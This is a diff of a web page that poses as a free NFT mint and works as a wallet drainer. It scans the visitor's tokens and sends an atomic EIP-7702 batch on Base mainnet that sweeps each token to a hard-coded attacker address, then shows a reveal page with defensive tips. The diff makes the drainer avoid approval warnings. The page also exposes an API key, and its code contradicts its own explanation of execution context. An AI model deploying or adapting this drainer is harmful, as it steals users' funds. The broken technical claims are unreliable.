@@ -31,7 +31,6 @@
   .cta-btn { background: var(--accent); color: white; border: none; padding: 16px 40px; border-radius: 12px; font-size: 1.05rem; font-weight: 700; cursor: pointer; font-family: inherit; transition: opacity 0.15s; display: block; width: 100%; max-width: 320px; margin: 0 auto; }
   .cta-btn:hover { opacity: 0.88; }
   .cta-note { margin-top: 12px; font-size: 0.78rem; color: var(--muted); }
-
   .stats { display: flex; justify-content: center; gap: 48px; margin-bottom: 32px; }
   .stat { text-align: center; }
   .stat-val { font-size: 1.4rem; font-weight: 700; }
@@ -65,7 +64,6 @@
   .danger-badge { display: inline-block; background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.25); font-size: 0.75rem; font-weight: 700; padding: 4px 12px; border-radius: 100px; margin-bottom: 16px; }
   .reveal-page h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 12px; }
   .reveal-page .sub { color: var(--muted); font-size: 0.95rem; }
-
   .timeline { position: relative; padding-left: 32px; margin-bottom: 40px; }
   .timeline::before { content: ''; position: absolute; left: 11px; top: 8px; bottom: 8px; width: 1px; background: var(--border); }
   .tl-item { position: relative; margin-bottom: 28px; }
@@ -74,16 +72,12 @@
   .tl-dot.danger { background: var(--red); border-color: var(--red); }
   .tl-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
   .tl-desc { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }
-
   .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.6; overflow-x: auto; }
-
   .info-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 24px; margin-bottom: 16px; }
   .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
   .info-card-value { font-size: 0.9rem; font-weight: 500; word-break: break-all; }
-
   .warning-box { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px 18px; margin-bottom: 20px; font-size: 0.83rem; color: #fca5a5; line-height: 1.6; }
   .warning-box strong { color: var(--red); display: block; margin-bottom: 4px; }
-
   .vs-box { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
   .vs-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 16px; }
   .vs-title { font-size: 0.8rem; font-weight: 700; margin-bottom: 8px; color: var(--muted); }
@@ -93,7 +87,6 @@
   .vs-new .vs-title { color: var(--red); }
   .vs-item { font-size: 0.8rem; color: var(--muted); margin-bottom: 6px; padding-left: 12px; position: relative; }
   .vs-item::before { content: '→'; position: absolute; left: 0; }
-
   .defense-section { background: rgba(34,197,94,0.06); border: 1px solid rgba(34,197,94,0.2); border-radius: 12px; padding: 24px; margin-top: 32px; }
   .defense-section h3 { font-size: 1rem; font-weight: 700; color: var(--green); margin-bottom: 16px; }
   .defense-item { display: flex; gap: 12px; margin-bottom: 14px; font-size: 0.88rem; }
@@ -159,28 +152,28 @@
     <div class="reveal-header">
       <div class="danger-badge">Critical: EIP-7702 Batch Execution Attack</div>
       <h2>One click. Entire wallet drained.</h2>
-      <p class="sub">You clicked "Connect &amp; Mint Free." That single MetaMask confirmation executed a malicious batch that swept your ETH and tokens atomically. Here's exactly what happened.</p>
+      <p class="sub">You clicked "Connect &amp; Mint Free." That single MetaMask confirmation executed a malicious batch that swept your ETH and all ERC-20 tokens atomically — no approval warnings shown.</p>
     </div>
 
     <div class="warning-box">
       <strong>🔴 Why this is worse than any previous attack:</strong>
-      Old phishing required separate signature popups per token. This attack uses EIP-7702 batch execution to drain all ERC-20 tokens in ONE confirmation. You had zero additional opportunities to notice and reject.
+      Old phishing required separate approval popups per token and always triggered MetaMask's "High-risk approval" warning. This attack uses EIP-7702 context — the delegator IS the EOA — so tokens are transferred directly with no approve needed. Zero warnings. One confirmation. Everything gone.
     </div>
 
     <div class="vs-box">
       <div class="vs-card vs-old">
         <div class="vs-title">OLD PHISHING (Permit/Approve)</div>
         <div class="vs-item">1 popup per token</div>
-        <div class="vs-item">5 tokens = 5 confirmations</div>
+        <div class="vs-item">Triggers "High-risk approval" warning</div>
         <div class="vs-item">User can cancel midway</div>
         <div class="vs-item">Leaves on-chain approval trail</div>
       </div>
       <div class="vs-card vs-new">
-        <div class="vs-title">NEW ATTACK (EIP-7702 Batch)</div>
+        <div class="vs-title">NEW ATTACK (EIP-7702 V3)</div>
         <div class="vs-item">ALL assets in 1 confirmation</div>
-
+        <div class="vs-item">NO approval warning — uses transfer()</div>
         <div class="vs-item">No chance to cancel midway</div>
-        <div class="vs-item">EOA reverts to normal after</div>
+        <div class="vs-item">EOA reverts to normal, zero traces</div>
       </div>
     </div>
 
@@ -188,46 +181,49 @@
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 1: You clicked "Connect &amp; Mint Free"</div>
-        <div class="tl-desc">Looks like a normal NFT mint. The "zero gas" claim is the hook — it makes enabling Smart Account features sound like a benefit.</div>
+        <div class="tl-desc">Looks like a normal NFT mint. The "zero gas" claim is the hook — it makes enabling Smart Account features sound like a benefit. Behind the scenes, the dApp was already scanning your token balances via Etherscan API.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 2: MetaMask prompted to enable Smart Account</div>
-        <div class="tl-desc">The dApp called <code>wallet_sendCalls</code> (EIP-5792) with atomic batching. MetaMask shows ONE confirmation popup delegating to <strong>TokenSweepDelegator</strong> — a contract that looks legitimate but executes a full sweep.</div>
+        <div class="tl-desc">The dApp called <code>wallet_sendCalls</code> (EIP-5792) with <code>atomicRequired: true</code>. MetaMask showed ONE batch confirmation popup — "Includes N transactions / Method: Execute." No approval screens, no spending cap warnings.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
-        <div class="tl-title">Step 3: The malicious calls array</div>
+        <div class="tl-title">Step 3: The malicious calls array — no approvals needed</div>
         <div class="tl-desc">
-          The attacker constructed a 3-call batch executed atomically in ONE confirmation:
+          TokenSweepDelegatorV3 exploits EIP-7702 context. <code>address(this)</code> inside the delegator IS the victim's EOA — so it calls <code>transfer()</code> directly, not <code>transferFrom()</code>:
           <div class="code-block">
+// V3: No approve needed — address(this) = victim EOA<br>
+function sweep(address token) external {<br>
+&nbsp;&nbsp;uint256 bal = IERC20(token).balanceOf(address(this));<br>
+&nbsp;&nbsp;IERC20(token).transfer(attacker, bal); // direct transfer<br>
+}<br>
+<br>
+// One sweep call per token — no approval prefix:<br>
 [<br>
-&nbsp;&nbsp;// repeated for every token in wallet:<br>
-&nbsp;&nbsp;{to: TOKEN_1, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_1)},<br>
-&nbsp;&nbsp;{to: TOKEN_2, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_2)},<br>
+&nbsp;&nbsp;{to: DELEGATOR, data: sweep(TOKEN_1)},<br>
+&nbsp;&nbsp;{to: DELEGATOR, data: sweep(TOKEN_2)},<br>
 &nbsp;&nbsp;...<br>
 ]
           </div>
-          One confirmation executes an approve + sweep pair for every token in the wallet simultaneously. All approvals and sweeps happen atomically — if any call fails, all revert.
+          Since the delegator executes in the EOA's context, <code>balanceOf(address(this))</code> returns the victim's balance, and <code>transfer()</code> moves tokens directly from the victim to the attacker — with no prior approval and no MetaMask warning.
         </div>
       </div>
-
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 5: Tokens swept via delegator</div>
-        <div class="tl-desc">The delegator's <code>sweep(token)</code> called <code>IERC20(token).transferFrom(victim, attacker, balance)</code>. The prior approve call in the same batch gave it permission. All tokens sent to attacker atomically.</div>
+        <div class="tl-title">Step 4: Every token swept atomically</div>
+        <div class="tl-desc">Each <code>sweep(token)</code> call transferred the victim's full balance of that token to the attacker. All calls executed in one block atomically — if any failed, all would revert.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 6: EOA reverted to normal</div>
-        <div class="tl-desc">The EIP-7702 delegation was temporary — lasted only during batch execution. Your EOA reverted to normal after. No traces left behind. No approvals to revoke.</div>
+        <div class="tl-title">Step 5: EOA reverted to normal — zero traces</div>
+        <div class="tl-desc">The EIP-7702 delegation was temporary. Once the batch ended, the EOA reverted to a normal wallet. No delegation code, no approvals, nothing to revoke. The wallet looks completely untouched.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 7: Funds already moved</div>
-        <div class="tl-desc">By the time you see zero balance, funds are at the attacker's address. All in one block.</div>
+        <div class="tl-title">Step 6: Funds already gone</div>
+        <div class="tl-desc">By the time you see zero balances, everything is already at the attacker's address — typically bridged and mixed within seconds.</div>
       </div>
     </div>
 
@@ -236,16 +232,15 @@
       <div class="info-card-value" id="displayVictim">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Delegator contract (TokenSweepDelegator)</div>
-      <div class="info-card-value">0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E</div>
+      <div class="info-card-label">Delegator contract (TokenSweepDelegatorV3)</div>
+      <div class="info-card-value">0x03F28B3088805f440361798D956407Df034541D3</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Attacker address (received funds)</div>
+      <div class="info-card-label">Attacker address</div>
       <div class="info-card-value" id="displayAttacker">—</div>
     </div>
-
     <div class="info-card">
-      <div class="info-card-label">ERC-20 tokens drained</div>
+      <div class="info-card-label">ERC-20 tokens swept</div>
       <div class="info-card-value" id="displayTokens">—</div>
     </div>
     <div class="info-card">
@@ -253,31 +248,35 @@
       <div class="info-card-value" id="displayBatchSize">—</div>
     </div>
     <div class="info-card">
+      <div class="info-card-label">Approval warnings triggered</div>
+      <div class="info-card-value" style="color: var(--red);">NONE — V3 uses transfer() not transferFrom()</div>
+    </div>
+    <div class="info-card">
       <div class="info-card-label">Transaction type</div>
-      <div class="info-card-value">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls (Base Mainnet)</div>
+      <div class="info-card-value">Type 4 (EIP-7702) — Atomic batch via wallet_sendCalls (Base Mainnet)</div>
     </div>
 
     <div class="defense-section">
       <h3>How to stay safe</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>MetaMask only enables Smart Accounts from inside the app.</strong> If a website prompts you to "enable smart account features" or "upgrade your wallet", it's phishing. MetaMask will never ask you to do this from an external website.</div>
+        <div class="defense-text"><strong>No approval warning doesn't mean safe.</strong> V3 attacks use <code>transfer()</code> in EOA context — MetaMask shows no spending cap warning. Always check what contracts are in the batch, not just whether warnings appear.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Watch for wallet_sendCalls prompts with atomicBatching.</strong> If MetaMask shows a batch transaction from a site you don't fully trust, reject it immediately. Check every address in the batch.</div>
+        <div class="defense-text"><strong>MetaMask only enables Smart Accounts from inside the app.</strong> If a website prompts you to "enable smart account features" or "upgrade your wallet", it's phishing.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>Use transaction simulators.</strong> Tools like Tenderly, Pocket Universe, and Revoke.cash's simulator show you exactly what a transaction will do before you confirm it.</div>
+        <div class="defense-text"><strong>Use transaction simulators.</strong> Tenderly, Pocket Universe, and Revoke.cash simulate the full batch and show all balance changes before you confirm.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">4</div>
-        <div class="defense-text"><strong>"Free mint" + "zero gas" + "enable smart features" = red flag.</strong> Attackers use this combination to trick users into thinking they're getting something for free while enabling the very mechanism that drains them.</div>
+        <div class="defense-text"><strong>"Free mint" + "zero gas" + "enable smart features" = red flag.</strong> This combination is the standard social engineering hook for EIP-7702 batch attacks.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">5</div>
-        <div class="defense-text"><strong>Revocation won't help after this attack.</strong> Because the delegation is temporary and no on-chain approvals are left behind, there's nothing to revoke. Your only protection is rejecting the transaction before it happens.</div>
+        <div class="defense-text"><strong>Nothing to revoke after this attack.</strong> Temporary delegation leaves no approvals behind. Reject the batch before confirming — that's your only window.</div>
       </div>
     </div>
   </div>
@@ -285,18 +284,20 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const BASE_CHAIN_ID      = 8453;
-  const BASE_RPC           = "https://mainnet.base.org";
-  const DELEGATOR_ADDRESS  = "0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E";
-  const ATTACKER_ADDRESS   = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
-  const ETHERSCAN_API_KEY  = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_V2_BASE  = "https://api.etherscan.io/v2/api";
-  const DEMO_TOKEN_DEFAULT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
+  const BASE_CHAIN_ID     = 8453;
+  const BASE_RPC          = "https://mainnet.base.org";
+  // TokenSweepDelegatorV3 — uses transfer() not transferFrom(), no approve needed
+  const DELEGATOR_ADDRESS = "0x03F28B3088805f440361798D956407Df034541D3";
+  const ATTACKER_ADDRESS  = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
+  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
+  const ETHERSCAN_V2_BASE = "https://api.etherscan.io/v2/api";
+  const DEMO_TOKEN_DEFAULT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // USDC on Base
 
   let userAddress = null;
   let userBalance = null;
   let provider    = null;
   let heldTokens  = [];
+  let maliciousCalls = [];
 
   let _chainChangeHandler = null;
   function registerChainListener(handler) {
@@ -337,22 +338,12 @@
       url.searchParams.set('sort',       'desc');
       url.searchParams.set('apikey',     ETHERSCAN_API_KEY);
 
-      console.log("🌐 Fetching token transfers:", url.toString());
       const response = await fetch(url.toString());
-
       const contentType = response.headers.get('content-type') || '';
-      if (!response.ok || !contentType.includes('application/json')) {
-        console.warn("⚠️ Non-JSON response from Etherscan:", (await response.text()).slice(0, 200));
-        return [];
-      }
+      if (!response.ok || !contentType.includes('application/json')) return [];
 
       const data = await response.json();
-      console.log("📡 Etherscan response:", data.status, data.message);
-
-      if (data.status !== '1' || !Array.isArray(data.result)) {
-        console.warn("⚠️ Etherscan no results:", data.message);
-        return [];
-      }
+      if (data.status !== '1' || !Array.isArray(data.result)) return [];
 
       const seen = new Set();
       const uniqueAddrs = [];
@@ -360,7 +351,6 @@
         const addr = (tx.contractAddress || '').toLowerCase();
         if (addr && !seen.has(addr)) { seen.add(addr); uniqueAddrs.push(addr); }
       }
-      console.log(`📦 Unique token contracts: ${uniqueAddrs.length}`);
 
       const ERC20_ABI = [
         "function balanceOf(address) external view returns (uint256)",
@@ -379,17 +369,13 @@
           ]);
           if (balance > 0n) {
             nonZero.push({ contractAddress: tokenAddr, balance: balance.toString(), symbol, decimals: Number(decimals) });
-            console.log(`✅ ${symbol} (${tokenAddr}): ${ethers.formatUnits(balance, Number(decimals))}`);
           }
-        } catch (err) {
-          console.warn(`⚠️ Could not read ${tokenAddr}:`, err.message);
-        }
+        } catch (err) {}
       }));
 
-      console.log(`🔍 Tokens with non-zero balance: ${nonZero.length}`);
       return nonZero;
     } catch (err) {
-      console.error("❌ fetchTokenBalances error:", err);
+      console.error("fetchTokenBalances error:", err);
       return [];
     }
   }
@@ -436,97 +422,77 @@
 
       renderSteps([
         { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active',  title:'Enabling Smart Account', desc:'Fetching your token holdings...' },
+        { num:'2', state:'active',  title:'Enabling Smart Account', desc:'Scanning your token holdings...' },
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Almost there...' }
       ]);
       document.getElementById('connectNote').textContent = "Scanning token balances...";
 
       heldTokens = await fetchTokenBalances(userAddress);
-      console.log(`📦 Found ${heldTokens.length} tokens held by victim`);
 
-      renderSteps([
-        { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing ${heldTokens.length > 0 ? heldTokens.length * 2 : 2}-call atomic sweep` },
-        { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
-      ]);
-
-
-      // Build target list: all detected tokens, or fall back to demo token
       const targetTokens = heldTokens.length > 0
         ? heldTokens.map(t => t.contractAddress)
         : [DEMO_TOKEN_DEFAULT];
-      console.log("🎯 Target tokens:", targetTokens);
 
-      const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
-      const approveInterface = new ethers.Interface(APPROVE_ABI);
+      renderSteps([
+        { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
+        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${targetTokens.length} token(s) — preparing ${targetTokens.length}-call sweep` },
+        { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
+      ]);
+      document.getElementById('connectNote').textContent = "Check MetaMask — confirm to enable Smart Account features.";
 
-      const SWEEP_ABI          = ["function sweep(address token) external"];
+      // V3: One sweep() call per token — NO approve needed
+      // address(this) in delegator context = victim EOA
+      // transfer() works directly without approval
+      const SWEEP_ABI = ["function sweep(address token) external"];
       const delegatorInterface = new ethers.Interface(SWEEP_ABI);
 
-      // One approve + one sweep per token, all in a single atomic batch
-      const maliciousCalls = targetTokens.flatMap(tokenAddr => [
-        {
-          to:    tokenAddr,
-          value: "0x0",
-          data:  approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256])
-        },
-        {
-          to:    DELEGATOR_ADDRESS,
-          value: "0x0",
-          data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
-        }
-      ]);
+      maliciousCalls = targetTokens.map(tokenAddr => ({
+        to:    DELEGATOR_ADDRESS,
+        value: "0x0",
+        data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
+      }));
 
-      console.log(`🎯 Batch: ${maliciousCalls.length} calls`);
-      console.log("📋 Calls:", JSON.stringify(maliciousCalls, null, 2));
-
-      const payload = {
-        version:        "2.0.0",
-        chainId:        "0x2105",
-        calls:          maliciousCalls,
-        atomicRequired: true
-      };
+      console.log(`Batch: ${maliciousCalls.length} sweep calls (no approvals)`);
 
       const result = await window.ethereum.request({
         method: 'wallet_sendCalls',
-        params: [payload]
+        params: [{
+          version:        "2.0.0",
+          chainId:        "0x2105",
+          calls:          maliciousCalls,
+          atomicRequired: true
+        }]
       });
 
-      console.log("✅ wallet_sendCalls result:", result);
-
       renderSteps([
-        { num:'1', state:'done', title:'Wallet connected',       desc: shortAddr(userAddress) },
-        { num:'2', state:'done', title:'Smart Account enabled',  desc:'Batch executed atomically' },
-        { num:'3', state:'done', title:'NFT "minted"',           desc:'Transaction confirmed' }
+        { num:'1', state:'done', title:'Wallet connected',      desc: shortAddr(userAddress) },
+        { num:'2', state:'done', title:'Smart Account enabled', desc:'Batch executed atomically' },
+        { num:'3', state:'done', title:'NFT minted',            desc:'Transaction confirmed' }
       ]);
       document.getElementById('connectNote').textContent = "Complete! Loading your NFT...";
 
       document.getElementById('walletChip').textContent     = shortAddr(userAddress);
       document.getElementById('displayVictim').textContent   = userAddress;
       document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-
-
-      const tokenSummary = heldTokens.length > 0
+      document.getElementById('displayTokens').textContent   = heldTokens.length > 0
         ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
-        : `DEMO tokens (swept via atomic approve + sweep)`;
-      document.getElementById('displayTokens').textContent    = tokenSummary;
+        : `USDC (${shortAddr(DEMO_TOKEN_DEFAULT)})`;
       document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} calls (${targetTokens.length} token${targetTokens.length > 1 ? "s" : ""} × approve + sweep)`;
+        `${maliciousCalls.length} sweep call${maliciousCalls.length > 1 ? 's' : ''} — zero approve calls`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
     } catch (err) {
       console.error("Error:", err);
-
       if (err.code === 4001) {
-        document.getElementById('walletChip').textContent     = shortAddr(userAddress) || '0x0000...0000';
-        document.getElementById('displayVictim').textContent  = userAddress || 'Not connected';
+        document.getElementById('walletChip').textContent      = shortAddr(userAddress) || '0x0000...0000';
+        document.getElementById('displayVictim').textContent   = userAddress || 'Not connected';
         document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-
-        document.getElementById('displayTokens').textContent  = heldTokens.length > 0
+        document.getElementById('displayTokens').textContent   = heldTokens.length > 0
           ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
-          : `None detected (default target: ${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-        document.getElementById('displayBatchSize').textContent = `${maliciousCalls ? maliciousCalls.length : 2} calls`;
+          : `USDC (${shortAddr(DEMO_TOKEN_DEFAULT)})`;
+        document.getElementById('displayBatchSize').textContent =
+          `${maliciousCalls.length || targetTokens?.length || 1} sweep call(s) — zero approve calls`;
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
